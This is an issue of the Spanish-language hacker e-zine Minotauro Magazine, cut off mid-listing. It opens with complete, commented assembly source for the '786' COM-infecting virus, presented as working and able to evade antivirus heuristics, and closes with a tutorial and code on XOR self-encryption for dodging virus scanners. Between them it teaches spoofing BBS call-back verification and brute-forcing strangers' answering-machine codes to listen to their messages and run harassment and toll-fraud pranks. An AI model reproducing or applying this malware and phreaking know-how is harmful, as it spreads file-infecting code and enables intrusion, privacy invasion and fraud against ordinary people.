Minotauro Magazine Issue n§3..

	Hi readers.. Me pregunto algo: No tienen nada mejor que hacer, a estar
leyendo estas publicaciones non-sanctas? eh?.. Bueno, si es as¡ son bienvenidos
a la Edici¢n n§3 de Minotauro Magazine..

	Pegandole un vistazo muy por encima a esta edici¢n, se dar n cuenta de
que incorporamos oficialmente a Lapidario como columnista.. Oficialmente porque
antes, por motivo de un shock nervioso (producido porque consiguio laburo :-),
no tenia el tiempo suficiente requerido para ser columnista..(a la mierda..!!)

Noticias de £ltimo momento: Se ha intensificado la lucha contra los 0-0 Day
WareZ d00des.. Su jefe, super Luck Martins, (tambien conocido como Murray de
la serie de televisi¢n 'Muelle 56'), ha amenazado a nuestro amigo de Satanic
Brain BBS con destruirle el BBS... ohhh! por dios! no lo hagas... todos los
programadores del mundo te lo rogamos!! Pero ‚l, con su 0-0 Day Warez, se ha
hecho una bomba para volarle todo el BBS a la mierda.. Pero como no habia ter_
minado de leer todo su manual de 0-0 Day Warez d00d, no habia llegado a la ul_
tima parte que decia:
 "Nunca probar si una 0-0 day bomb funciona en nuestra propia maquina!"
Jajaja, y el pobre se estropeo toda su maquina y quedo en 0-0 Megas Warez..
Jajaja... Y bueno, todo esto es para prevenirlos del alcance de la fiebre Warez
que, aunque no lo crean tiene mas de 2 adeptos... pobres.. por favor un minuto
de silencio por nuestros ex-hermanos.. 

	Cambiando de tema, se larga el concurso por un modem de 2400 al mejor
articulo de los lectores, el cual sera publicado en futuros numeros de la re_
vista.. Si, como lo escucharon ;) Asi que... ya saben ;)

Staff actual de Minotauro:
+ Lapidario
+ Drako
+ Wma
+ Zarathustra
+ Mortal
+ Trurl
+ Dr. Retro

===============================================================================
Indice:
 1) Virus 786 v1.01
 2) Fucking Call Back Verification
 3) Contestadores Automaticos
 4) Programaci¢n de Virus: Encripci¢n de datos
 5) Programaci¢n de Virus: Directory Stealth (FCB)
 6) F‚ de Erratas
 7) Dead to Minotauro BBS Silly Trojan Installer

===============================================================================;Fuente del 786 v1.01..
;------------------------------------------------------------------------------
;NOTA: ESTE ES UN VIRUS COMPLETAMENTE FUNCIONAL Y EN VIGENCIA EN LA CALLE.
;PUBLICADO CON EL CONSENTIMIENTO DE SU AUTOR: VIXER.
;Bueno, este es un virus sencillo, pero lo que no quita que sea efectivo.
;Este fuente es el fuente original del virus, NO un desensamblado, pero hemos
;decidido comentarlo un poco mas, cosa de que se haga la tarea un poco mas sen_
;cilla.
;Este es un virus no_residente, el cual infecta 1 archivo del directorio actual
;cada vez que se ejecuta un file infectado.. No tiene b£squeda transversal de
;archivos, por lo que su difusi¢n se limita un poco.. Su rango de infeccion se
;limita a archivos COM nada mas.. Pero tiene tambien puntos a su favor.. :-)
;En sus momentos, evadia totalmente al Thunderbyte y a otros antivirus..
;Pero bueno, tampoco esperen 'EL' virus de primera. :-) Conociendo como funcio_
;nan los virus mas sencillos, despues se hace mucho mas facil entender virus
;mas complejos.. Bueno, llendo al virus en si, trabaja de la siguiente manera :
;------------------------------------------------------------------------------
; /~~~\
;/ÄÄÄÄÄ\
;³     ³ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³     ³³ ViRuS 786 v1.01 --> por û­Xäâ                               ÚÙ
;³     Ã´~~~~~~~^^^~~~~~~~~~~~~~~~^^^^^~                             ÚÙ
;³     ³³                                                           ÚÙ
;³     Ã´Caracteristicas: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-ÚÙ
;³     ³³  -No residente                                          ÚÙ
;³     Ã´  -Appending                                            ÚÙ
;³     ³³  -No reinfecta files                                  ÚÙ
;³     Ã´ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;³     ³³  -Infecta al final del file                           À¿
;³     Ã´  -Manda un mensaje el 31 de diciembre                  À¿
;³     ³³  -Virulencia: 1 en 1                                    À¿
;³     Ã´  -Busca files en current path -=-=-=-=-=-=-=-=-=-=-=-=-=-À¿
;³     ³³  -Tecnicas anti-heuristicas                               À¿
;³     Ã´  ^(No lo detecta el TBAV en modo HIGH ni el F-PROT)        À¿
;³     ³³                                                             À¿
;³     ³³  /* Creado el 1 de Junio de 1994 */                          À¿
;³     ³ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;³     ³
;³     ³
;³     ³
;³     ³

.286c
Codigo  Segment 'code'
	org 100h
        Assume cs:Codigo, ds:Codigo, es:Codigo

Start   Proc Far

        jmp     Comienzo                ;JMP 3 bytes al virus
        db      "V"                     ;Marca de infecion
        nop
        nop                             ;Supuesto prog. infectado (host)
        mov     ax, 04c00h
        int     21h


;AQUI COMIENZA EL VIRUS EN SI--------------------------------------------------
Comienzo:                               ;Desde aqui comienza el Virus
        push    cs
        push    cs
        pop     ds
        pop     es
                                         
        call    Proc_falso              ;Llama a Proc_falso para que quede
Proc_falso      proc near               ;en el stack el reg. IP
Proc_falso      endp

        mov     di, sp                  ;Esto es equivalente a POP BP
        mov     bp, word ptr ss:[di]    ;SUB BP, OFFSET PROC_FALSO
        sub     bp, offset Proc_falso   ;Esto es una tecnica anti-heuristica
        add     sp, 02d

;Lo primero que hace al ejecutarse, es obtener su posicion en el file por medio
;del calculo del offset á. Una vez que sabe donde esta parado el virus, hace
;referencia a sus propias variables de forma relativa a bp..
;------------------------------------------------------------------------------

        mov     cx, 43d                 ;Salva DTA original
        lea     di, bp + DTA_orig
        mov     si, 0080h
        rep     movsb

;Lo que hace el virus en este momento, es salvar el DTA del programa infectado.
;Esto lo hacemos porque al buscar un file cualquiera para infectar con la fun_
;ci¢n 4eh (Buscar la primera entrada) ¢ 4fh (Buscar la pr¢xima entrada), se nos
;destruyen los datos que teniamos en el DTA original y se nos actualiza con los
;datos del archivo encontrado por medio de estas funciones. Esos datos son uti_
;lizados por el programa anfitri¢n, osea que al ser sobreescritos con los datos
;del file nuevo, el programa hace cualquiera.. Generalmente no se cuelga la ma_
;quina ni nada de eso, pero el programa saca datos de ahi como parametros y bo_
;ludeces asi, osea que el programa sale al DOS con error..
;------------------------------------------------------------------------------
        jmp     Check_PlayLoad          ;Claro que no ejecuta los datos
	;-------------------------------------------------------------
DTA_orig        db 43d dup (0)          ;Espacio para el DTA
Jump            db 0e9h                 ;JUMP
Firma           db "V"                  ;Firma del Virus
Longitud        db 2 dup (0)
Bytes_Orig      db 090h, 090h, 090h, 090h  ;Originales del prog. infectado
File_busc       db "*.C?M", 0
                ;Busca *.C?M y no *.COM. Es otra tecnica anti-heuristica

Mensaje db 0ah,0dh
        db "Este es el virus 786 Version 1 ", 0ah, 0dh          ;Mensaje
        db "Echo por --> û­xäâ [ûxâ]/A.H.D. HALKA/. Industria Argentina", 0ah, 0dh
        db "Quemen al mu¤eco del `94!", 0ah, 0dh

        db  "$  OHH NO, ME HA DESCUBIERTO!!!", 0ah, 0dh   ;String
;------------------------------------------------------------------------------

Check_PlayLoad:
        mov     ah, 02ah                ;Chequea si es diciembre
        int     021h

        cmp     dh, 12d
        jne     No_Playload

        cmp     dl, 31                  ;Chequea si es 31
        jne     No_Playload

;Aca se verifica si el mes de ejecuci¢n del file es Diciembre.. Esto se hace
;pidiendole la fecha al sistema con el servicio 2ah de la int 21h... Este ser_
;vicio nos devuelve el mes actual en DH, osea que lo comparo con el mes 12 (Di_
;ciembre :-).. si es el mes correcto, me fijo si es fin de a¤o (31 de Dic.),
;comparando DL con 31.. Donde DL contiene el dia actual.. En caso de que sea
;la fecha deseada, se ejecuta el playload, ¢ carga ¢ 'detonaci¢n' del virus.
;Como el 786 v1.01 es un virus ben‚volo, solo mostrara un mensaje y no dejara
;que se siga ejecutando el file infectado saliendo al DOS..
;En caso de que NO sea la fecha deseada, se salta a la etiqueta NO_PLAYLOAD,
;en donde se intenta infectar otro archivo..
;------------------------------------------------------------------------------
        mov     ax, 0900h               ;Es 31 de diciembre, mostrar mensaje!
        lea     dx, bp + Mensaje
        int     021h

        mov     ax, 04c00h              ;Y no ejecuta el prog. infectado
        int     021h

No_Playload:
        cld                             ;Restaura los 4 primeros bytes del prog
        mov     cx, 4d                  ;infectado
        mov     di, 0100h
        lea     si, bp + Bytes_Orig
        rep     movsb

;Con este c¢digo estoy restituyendo los primeros bytes del programa original,
;los que son sobreescritos con el objeto de darle el control a nuestro virus..
;Nosotros al infectar un file, y para que una vez que se ejecute el file, que
;nuestro virus sea el que PRIMERO tome el control, sobreescribimos los primeros
;bytes del programa con un 'éXX' donde el é es el ASCII del jump, y XX la di_
;reccion del salto... justamente la direccion de nuestro virus.. Bueno, todo
;esto perfecto, pero cuando le queremos devolver el control al programa origi_
;nal, con que nos encontramos ? Que hubiera estado piola guardar los primeros
;bytes del codigo original ;). Asi cuando le querramos dar el control, lo unico
;que necesitariamos es reemplazar los primeros bytes 'truchos' por los buenos,
;y saltar al offset 100h (De donde se carga todo el c¢digo ejecutable de TODOS
;los COM).
;------------------------------------------------------------------------------

Buscar_File:
        mov     ax, 04e00h              ;Busca primer file del directorio
        mov     cx, 0
        lea     dx, File_busc + bp
        int     021h
        jnb     Hay_files               ;Salta si hay *.C?M

;Bueno, entonces busco el primer COM del directorio.. Si encuentro algun file
;joya, salto a HAY_FILES y me fijo si esta infectado.. Si no hay ningun file, 
;le devuelvo el control al COM sin infectar nada y listo... mala leche :( ;)
;------------------------------------------------------------------------------

Retornar:                               ;No hay *.C?M
        mov     cx, 43d                 ;Restaura el DTA original
        lea     si, bp + DTA_orig
        mov     di, 0080h
        rep     movsb

        push    0100h                   ;Ejecuta el prog. infectado
        pop     ax                      ;Esto es igual que JMP 0100h
        jmp     ax                      ;Es una tecnica anti-heuristica

;Bueno, aca esta lo que decia antes sobre el DTA... Antes de ejecutar el file
;lo dejo como estaba ANTES de buscar los COM.. Y listo... ahora hago el salto
;al offset 100h, y ya esta... le di el control al COM anfitrion ;)
;------------------------------------------------------------------------------

Hay_files:
        mov     ax, 03d02h
        mov     dx, 0009eh              ;Abre el file encontrado
	int	021h
        push    ax
        pop     bx
        push    bx
        mov     ax, 03f00h              ;Lee los 4 bytes primeros
        mov     cx, 0004h
        lea     dx, Bytes_Orig + bp     ;Y los guarda en Bytes_Orig
        int     021h

        mov     cl, byte ptr cs:[bytes_orig + bp+3] ;Verifica si esta infectado
        cmp     cl, Firma + bp
        jne     Infectar

;Con este codigo verifico si el file recien encontrado YA estaba infectado.. 
;Lo que hago es abrir el file, comparar el 4to byte con 'û' y si coinciden es
;porque el archivo estaba infectado.. No es conveniente chequear con UN solo
;byte, ya que corremos el riesgo de que el file NO estubiese infectado, pero
;por una de esas casualidades, tenga en su 4to byte un 'û'.. Entonces el virus
;cree que ya estaba infectado y no lo infecta..
;Si la comparacion NO da Cero, osea que NO era 'û', se prepara para infectar el
;file.. (salta a INFECTAR)... sinom osea que ESTABA infectado, sigue buscando
;otro file... pero antes cierra el file que habia abierto..
;------------------------------------------------------------------------------

Proximo_File:
        pop     bx                      ;Esta infectado. Busca otro
        mov     ah, 03eh
        int     021h                    ;Cierra el file anterior

        mov     ah, 04fh
        int     021h
        jb      Retornar                ;Si salta no hay mas files
        jmp     Hay_files

;Aca busca otro file.. si salta por el JB (jump below), es que no habia mas COM
;en el directorio y no busca mas.. sino, es que encontr¢ otro file y vuelve a
;verificar si ya estaba infectado.. (JMP HAY_FILES)
;------------------------------------------------------------------------------

Infectar:                               ;Infecta el file!
        pop     bx
        push    bx
        mov     ax, 04200h              ;Mueve el puntero de lecto/escritura
                                        ;(LSEEK) al principio del prog.
        mov     cx, 0
        mov     dx, 0
        int     021h

        pop     bx                      ;Escrive el jmp para el Virus
        push    bx
        mov     ah, 040h
        mov     cx, 1
        lea     dx, Jump + bp
        int     021h

        mov     cx, 2                   ;Calcula el jmp para el virus
        mov     si, 009ah               ;(longitud del prog. + 1)
        lea     di, bp + Longitud
        rep     movsb
        add     Longitud + bp,1

        pop     bx                      ;Graba el resultado del
        push    bx                      ;calculo anterior
        mov     ah, 040h
        mov     cx, 2
        lea     dx, Longitud + bp
        int     021h

        pop     bx                      ;Escribe la marca de infeccion
        push    bx
        mov     ah, 040h
        mov     cx, 1
        lea     dx, bp + Firma
        int     021h

        pop     bx
        push    bx
        mov     ax, 04202h              ;Mueve el puntero de lecto/escritura
                                        ;(LSEEK) al final del prog.
        mov     cx, 0
        mov     dx, 0
        int     021h

        mov     cx, 43d                 ;Restaura el DTA original
        lea     si, bp + DTA_orig
        mov     di, 0080h
        rep     movsb

        mov     cx,43d                  ;Borra la variable DTA_orig
        lea     bx, DTA_orig + bp       ;Esto sirve para no crear
DTA_clr:                                ;falsas alarmas en los anti-virus
        mov     byte ptr [bx],0         ;heuristicos
        inc     bx
        loop    DTA_clr

        pop     bx                      ;Escrive el virus en el file
        push    bx
        mov     ah, 040h
        mov     cx, 1000d               ;El virus mide 512d bytes. Pero
        lea     dx, bp + Comienzo       ;le graba 1000d porque es menos
        int     021h                    ;notorio 

        pop     bx                      ;Ya infecto el prog!
        mov     ah, 03eh                ;Ahora lo cierra
        int     021h

        push    0100h                   ;Ejecuta el prog. host
        pop     ax                      ;Esto es igual a JMP 0100h
        jmp     ax                      ;Es una tecnica anti-heuristica


start endp
codigo ends
end start

;---> Este û­âu$ NO es Number_of_the_beast! <---

;ACLR: El TBAV y el F-PROT no lo detectan con busqueda heuristica, pero
;      si puede ser detectado con strings de busqueda.
;ACLR2:Si les interesa el fuente ORIGINAL del virus, se encuentra disponible
;      en cualquiera de los BBS que figuran en la lista..
;------------------------------------------------------------------------------Fucking Call Back Verification...
-------------------------------------------------------------------------------
	Bueno, este tema es bastante sencillo.. Antes que nada expliquemos lo
que es el Call Back Verification y como es que funciona.. Bueno, el Call Back
es un modo de validaci¢n autom tica.. el motivo de esto es la supuesta despreo_
cupaci¢n del operador del sistema o mas conocido como SysOp :-) para con el te_
ma de las validaciones.. El SysOp bal¡n se consigue uno de estos, y listo..
(piensa ‚l :-). La forma tradicional de validaci¢n es la siguiente:

+ Llamamos a un BBS, nos atiende un modem (por uno de esos pedos, vio ?), en_
tonces nos pide nuestro nombre o handle, n£mero de telefono y otros datos par_
ticulares.. Entonces una vez que cortamos, (generalmente dentro las primeras
48hs de la llamada, nos llama el operador para verificar los datos que ingresa_
mos antes).

	De esta manera ser¡a dificil obtener cuentas truchas en alg£n bbs, de_
bido a que el operador esta justamente verificando la autenticidad de la cuen_
ta. A menos que consigamos alguien pata, o alg£n n£mero que piensen que pueda
andar, es bastante jodido. (A menos que hagan pesar su simpat¡a :-), entonces
ah¡ no la consiguen ni en un bbs pirata, ;-)) . La otra manera de validaci¢n,
es la llamada Call Back:

+ Llamamos al bbs y toda esa mierda que dije antes :-). Pero en este caso, en
la validaci¢n NO interviene el operador, sino que se hace en forma autom tica.
Claro, una vez que cortamos, al toque el mismo bbs se encarga de llamarnos y de
verificar los datos.. Osea: El operador no se entera de lo que pasa.. buen pun_
to. Cuando recibimos la llamada, nos pide que ingresemos el password que habia_
mos puesto en el bbs.. si es correcto, ya estamos validados, sino anotados en
una lista o directamente lockeados. Eso depende del sistema.

	Ahora que ya conocen que es y como funciona el m‚todo, pensemos en como
cagarlo.. Hmmmm.. (Genio trabajando) Ya est ! :-)
Piensen algo.. Que pasa cuando llamamos a alguien, pero ‚ste individuo corta ?
Cuando quiere usar el tel‚fono de nuevo, tiene que esperar que se nos cante las
bolas cortar, porque al originar la llamada, somo NOSOTROS los que tenemos el
control de la linea. Bueno, con esto pasa lo mismo:

+ Estamos conectados al bbs, y queremos cortar y que nos llame para validarnos,
pero como ya estamos conectados, porque desaprovechar esa oportunidad ? eh ?
Entonces esta bien, cortamos, pero de mentiritas :-) Salimos del bbs por la op_
ci¢n de Goodbye o lo que sea, cosa de que corten ELLOS primero. Una vez que
cortamos por el bbs, deber¡amos levantar el tubo y mantener la comunicaci¢n a
manopla, porque el modem detecta el CARRIER DROP, osea la cortada del otro lado
y corta la comunicaci¢n desde aca tambi‚n.. Por eso dejamos que el est£pido
corte, pero nosotros levantamos el tubo. Para este momento, la comunicaci¢n en_
tre el bbs y nosotros se cag¢, pero la linea sigue viva.
	Ahora bien, entonces lo £nico que hace falta es esperar que el bbs dis_
que el n£mero que hab¡amos declarado, y cojer (en el buen sentido de la pala_
bra) la comunicaci¢n con el bbs de nuevo.. Pero ete aqu¡ otro problema, que el
bbs hasta que no encuentra tono en su linea, no disca.. Hmmmmmmmm...... y eso
como se podr  solucionar ? alguna idea ? -Aca profesor! -Si.. alumno Drako ?

Drako : -Y si le mandamos un tono de linea grabado ?
Profesor : -Excelente alumno!

Bueno, ya con la idea aportada por mu , tenemos este tema solucionado:
Osea que el bbs empieza a discar (al pedo evidentemente) y se encuentra al fi_
nal de la linea con nosotros, impacientes, y esperando esa pseudo_llamada con
un jugoso CARRIER, producible con el comando Hayes "ATA".

	Hasta aca todo bien, pero varios bbs que tienen este sistema poseen
varias lineas telef¢nicas.. con lo cual la cosa se complica. Por qu‚ ? Y bue;
medio obvio.. porque ya la linea que utilizaba el bbs para comunicarse con no_
sotros no es la misma con la que estamos comunicados. Generalmente los bbs con
varias lineas tienen los n£meros seguidos o por lo menos cerca.. Es posible que
una de esas l¡neas la dedique exclusivamente a esto. Ser  cuesti¢n de encontrar
ese n£mero scanneando por la cercan¡a del n£mero este, y una vez conectados,
lo mismo.

	Con este m‚todo podemos validar una cuenta (sin que el sysop se entere,
obviamente :-) en alg£n que otro bbs con validaci¢n por Call Back. Espero que
lo puedan aprovechar:	Drako
Contestadores Automaticos.. joda ;)
-------------------------------------------------------------------------------

 Bueno, en el art¡culo anterior se hablo sobre algunas formas de phreaking,
 especialmente la utilizaci¢n del BlueBox en la Argentina, para los que que-
 r¡an empezar con esto o para los que hacian algo de BlueBox pero no tenian
 idea que era lo que hacian.

 Esta vez quiero hablar sobre algo bastante b sico, como para poder empezar
 a hacer algunas pruebas, con esto no vamos a obtener beneficios como poder
 hacer llamadas gratis pero es una buena forma de empezar a practicar con c¢-
 digos de acceso y tambi‚n podemos divertinos bastante. Con esto me refiero
 a los CONTESTADORES AUTOMATICOS.

 Un gran porcentaje de personas poseen contestadores autom ticos en sus casas
 (yo los odio), en los algunos modelos se tiene la posibilidad de acceder a los
 mensajes grabados, y otras opciones por medio de tonos (DTMF) en forma remota,
 o sea llamando desde otro tel‚fono y usar el teclado del tel‚fono para ver el
 estado de nuestro contestador.
 Porque no llamar al contestador de nuestro vecino que tanto odiamos y escuchar
 los mensajes que le dejaron?.
 Es una buena diversi¢n, aparte es algo como para empezar con el Phreaking, y
 a familiarizarse con los codigos de acceso, ya que si pretendemos acceder a
 algun PBX generalmente tenemos que poner un c¢digo de acceso.
 Obviamente para acceder a estas funciones tenemos que ingresar un c¢digo de
 acceso a travez de tonos, estos c¢digos pueden variar entre 2 y 5 digitos,
 cuanto mayor cantidad de funciones tenga el contestador mas digitos tendra
 el c¢digo de acceso.

 Pero cual es una de las marcas de contestadores mas difundida?
 - PANASONIC -

 La mayoria de la gente tiene los modelos de Panasonic que solo utilizan codi-
 gos de 2 digitos, f cil de buscar el c¢digo solo va de 0-99 (100 c¢digos)
 Para hacerlo aun m s f cil, con enviar la siguiente combinaci¢n ya hemos
 enviado todos los c¢digos:

 01122334455667788991357902468036925814715937049483827261605172959628408529
 639974197531864209876543210

 Pero si consideramos que generalmente los modelos Panasonic no usan digitos
 del 0 al 9, solo algunos, solo deberiamos enviar una combinaci¢n como la si-
 guiente o algo parecida:

 33556636653

 Una vez que ingresamos el c¢digo correcto, el contestador nos va a tirar una
 seria de BEEPs y se queda esperando que le mandemos un comando, que para los
 modelos panasonic mas convencionales son:

 1 - Retrocede un mensaje
 2 - Avanza al proximo mensaje
 3 - RESET
 5 - PLAY
 6 - Room monitoring
 7 - Record receive message
 9 - End receive message
 0 - Discontect answering machine
 * - Skip Message

 Funci¢n *: Nos permite pasar por alto el mensaje de recepci¢n, y empezar a
 grabar el mensaje o enviar el c¢digo al contestador.

 Funci¢n 1: Retrocede al mensaje anterior y lo reproduce

 Funci¢n 2: Avanza al pr¢ximo mensaje que hay grabado.

 Funci¢n 3: Resetea el contestador, vuelve al mensaje 0 y cuando dejemos uno
 sobreescribe los mensajes grabados, etc.

 Funci¢n 5: Reproduce los mensajes que hay grabados en el contestador autom -
 tico.

 Funci¢n 6: Nos permite escuchar lo que esta sucediendo a donde llamamos, ya
 que el constestador habilita el microfono que tiene incorporado, esta funci¢n
 no sirve de mucho, solo para saber si hay alguien hablando en la casa o alg£n
 otra boludez.

 Funci¢n 7: Esta es una de las mas interesantes, nos permite grabar el mensaje
 que se envia al recibir una llamada. Aca tenemos varias cosas para hacer, una
 es grabarle cualquier mierda, otra es llamar a un lugar donde mandan Putas a
 domicilio y pedirle que manden a una puta a la casa de algun 'AMIGO' y decirle
 que llamen al n£mero del contestador. En el contestador debemos grabar algo
 asi como:

  -  Si si, yo hice la llamada o alguna cosa por el estilo.
 Esto para que resulte hay que llegar a hacerlo muy bien, calcular bien los
 tiempos y por ahi resulta.

  Otra cosa para hacer es, si tenemos a alg£n amigo que viva en otro pa¡s es
 arreglar para que haga una llamada con cobro revert¡do (v¡a operadora) a ese
 n£mero y dejar grabado:

 - Hola? <PAUSA> SI, si acepto la llamada.
 - Hello? <PAUSA> Yes I accept the Call.

  Esto es para alguien que odiemos, porque si lo hacemos unas cuantas veces, el
 pobre chabon se va a tener un "poquito" de recargo en la boleta de tel‚fono.

 Funci¢n 8: Esta funci¢n se usa despues de la 7, con esto le indicamos al con-
 testador que hemos terminado de grabar el mensaje de recepci¢n.

 Funci¢n 0: Desconecta el Contestador autom tico, pero no es una desconecci¢n
 total, ya que si llamamos y dejamos sonar 15 veces el contestador se vuelve
 a encender automaticamente.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Otras marcas de contestadores ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 Estas funci¢nes son para algunos modelos de contestadores AT&T y por ahi
 tambi‚n funcionan con alg£n otra marca:

 1 Retroceder
 2 Repetir
 3 Avance
 4 Grabar mensaje de recepci¢n (De nuevo para terminar de grabar)
 5 Stop
 6 Grabar Mensajes
 8 Play >
 9 Desconecta el contestador
 0 Anuncio de la fecha y la hora
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  Si el contestador tiene mas de 2 digitos en el c¢digo, ya se complica un poco
 mas, pero hay que tener en cuenta que muy poca gente utiliza los contestadores
 en forma remota, mas de uno no sabe que es eso, asi que ninguno se calienta en
 cambiarle el c¢digo (en alg£nos no se puede cambiar), asi que siempre hay que
 probar con los que vienen por default:
 1111,0000,1234,9999 y c¢digos asi.

 Algunos de los contestadores mas nuevos tienen una funci¢n muy interesante,
 que es la de programar al contestador para que cada vez que nos dejan un men-
 saje nos llame a un n£mero y nos lo pase, si podemos acceder a uno de estos
 contestadores, que tienen 4 o 5 n£meros de c¢digo, podr¡amos programarlo para
 que llame a alg£n n£mero Internacional, y asi entrar a dejarle mensajes, y es
 mejor si le podemos llegar a ver la cara al tipo cuando recibe la boleta a fin
 del bimestre :)

 Espero que con esto se diviertan bastante, y se pongan en practica para sacar
 c¢digos.!

                                                    Dr.Retro
Encripci¢n, parte 1...
-------------------------------------------------------------------------------
Algunas definiciones
--------------------
Criptografia: del griego          graphe----->accion de escribir
              y de                kruptos---->oculto  

 Arte de escribir con clave secreta o de modo enigmatico.

Que es encriptar.
-----------------
Encriptar ( en nuestro metie ) consiste en codificar o cambiar un codigo
perfectamente legible por otro que a primera instancia no lo sea.

Para que encriptamos un codigo.
-------------------------------

a)Para que no sea legible el codigo a simple vista al hacer un desensamblado.
b)Para que algunos antivirus heuristicos no nos jodan.
c)Para que en cada encriptacion si es posible sea distinta , de tal manera que
  en cada reproduccion el codigo sea distinto y no se encuentre una cadena
  fija permanente que pueda ser usada por los scaner.(Realizar esto implicaria
  una mezcla de encriptacion con mutacion-)
d)En definitiva para camuflear el codigo.
e)Para lo que se les ocurra.

Formato general de un programa que use encriptamiento.
------------------------------------------------------

startprog:         CALL desencripar
;******************************************************************
;parte del codigo que queremos encriptar

mark:               ...
                    ...
endmark:            ...

;******************************************************************
;rutina de desencriptacion

desencriptar proc
                   ...
                   ...
                   ...
desencriptar endp

                    
De el bosquejo anterior usted puede empezar a razonar lo siguiente..

a)La cabezera o sea ------>call desencriptar , permanecera inmutable por
 mas que la rutina de encriptacion en cada reproduccion codifique de forma
 diferente la porcion de codigo comprendida entre las etiquetas mark y
 endmark.

b)La rutina de desencriptacion nunca sera encriptada y por lo tanto le cabe
 las mismas consideraciones expuestas en a).
 Dado que la longitud de esta rutina es larga , mas facil es encontrar una
 cadena que se pueda usar para identificar al virus.
 
c)De lo anterior se deduce que la rutina de desencriptacion debe ser de la
  menor longitud posible , o mejor distinta en cada reproduccion.

d)La rutina de encriptacion , esta encriptada---->Redundancia??
 

Como se encripta.
-----------------
El virus se debe encriptar justamente antes de reproducirce.
Las rutinas de encriptacion basicas generalmente operan sobre los bytes del
codigo realizando operaciones logicas o aritmeticas sobre estos.

Utilizando xor.
~~~~~~~~~~~~~~~
  
La intrucion xor destino,fuente realiza un or exclusivo entre destino y fuente
y el resultado queda en destino.

destino    xor    fuente         destino
  0                 0              0
  0                 1              1
  1                 0              1
  1                 1              1

Lo divertido de la intruccion xor es que si realizamos dos veces la instruccion
xor con el mismo valor obtenemos el dato original.

EJEMPLO.
~~~~~~~    mov cl,55h
           mov bl,0aah----------->registro bl=AA en hexa.
           xor bl,cl ------------> bl xor cl ---->bl=FF en hexa.

           xor bl,cl-------------> bl xor cl ---->bl=AA en hexa.

Esto es ideal para encriptar ya que la rutina de encriptacion y la de
desencriptacion sera identica.

A modo de ejemplo utilizaremos un programa .com  que cada vez que se ejecuta se
sobrescribe sobre si mismo encriptandoce.
 
Paso a Paso.
------------
1) Programa sin encriptacion.
;________________________cortar aqui_________________________________
;compilarlo con nombre prueba1.com

code segment
              org 0100h
              assume cs:code,ds:code
programa      proc far
uno:
              lea dx, saludo
              mov ah,09h
              int 21h                    ;imprime Minotauro
        
              mov ax,3d02h               ;habre el file prueba1.com
              lea dx,file                ;modo lectura escritura
              int 21h                    ;debuelve file handle en ax
              mov (handle), ax

              mov bx, (handle)
              lea cx,dos                 ;calcula y guarda en cx la
              lea ax,uno                 ;longitud en bytes de este programa
              sub cx,ax
            
              lea dx,uno                 ;buffer comienza en ds:uno 
            
              mov ax,4000h
              int 21h                    ;se sobreescribe este programa
            
              mov ax,3e00h               ;cierra el file prueba1.com
              int 21h

              mov ah,4ch                 ;vuelve al dos
              int 21h

saludo   db  "Minotauro$"
file     db  "prueba1.com",0
handle   dw  1 dup (?)   
dos:
programa endp
code ends
end           programa
;__________________________cortar aqui____________________________________

Bien si usted a ejecutado el programa anterio vera que funciona correctamente.
Pero ahora suponga que el programa anterior sea un codigo de un virus
infector de .com no residente.
Entonces seria facil para el anti extraer una firma ($%#@&*@-%##-->dedicado
al anti),consistente en un string de bytes lo suficientemente extenso para
ser utilizado por un scaner ya que el codigo permanece igual en cada corrida.
Para evitar este inconveniente encriptaremos el programa anterior utilizando
xor.
 

2) Encriptado con xor.

 Los pasos en el programa serian los siguientes:

 a)Desencriptar con la llave existente
 b)Se ejecuta el programa desencriptado
 c)Generar una nueva llave
 d)Encriptar y sobreescribirse
 e)Devolver el control.
 
La rutina de encriptacion y desencriptacion.
--------------------------------------------
nombre:encrEsta rutina es la encargada de encriptar y desencriptar , por lo tanto
sera casi la unica parte que quedara siempre sin encriptar.
Basicamente trabajara encriptando o desencriptando el codigo comprendido
entre las etiquetas mark y endmark.
Realizara una xor exclusive con una llave que se guarda en xorkey ,
la cual es una variable tipo word.
Prefiero hacer xor con word en vez de bytes debido a con el primero
tendremos 65535 codificaciones del codigo distinto , contra 255 si usamos
bytes.
( Esto no es tan asi por el metodo con que se genera la llave)
De ordinario la primera vez debera realizar un xor con llave igual a cero.
Luego el programa genera una nueva llave , utilizando el servicio int 21,2c
lectura de tiempo y fecha del dos.
Esta nueva llave es guardada en la variable xorkey y se utilizara en el
momento de encriptacion.
De mas esta decir que la variable xorkey no es encriptada.

UNA COSA MAS.
-------------

Debido  a que pretendemos codificar lo maximo posible el codigo ,
la parte de copiado y devolucion del control al dos (o al anfitrion si estamos
realizando un virus ) es copiada en memoria al final del virus ,esto
debido a que si no hariamos esto esta parte tambien tendria que quedar sin
codificar.
Esto es la porcion de codigo comprendido entre l1 y l2.


;___________________________cortar aqui____________________________________
;compilarlo con nombre prueba2.com

code segment
              org 0100h
              assume cs:code,ds:code
programa      proc far
uno:
;*****************************************************************************
;Esta parte en este programa no haria falta , esto es para allar el delta offset
;para direccionar atravez de bp pues en un virus infector de com si este
;se anexa al final las etiquetas quedarian mal direccionadas.

              CALL falso
falso proc
falso endp
              pop bp
              sub bp,0103h
;*****************************************************************************
              call encr_desc
mark:


start:
              lea dx, saludo + bp
              mov ah,09h
              int 21h                    ;imprime Minotauro
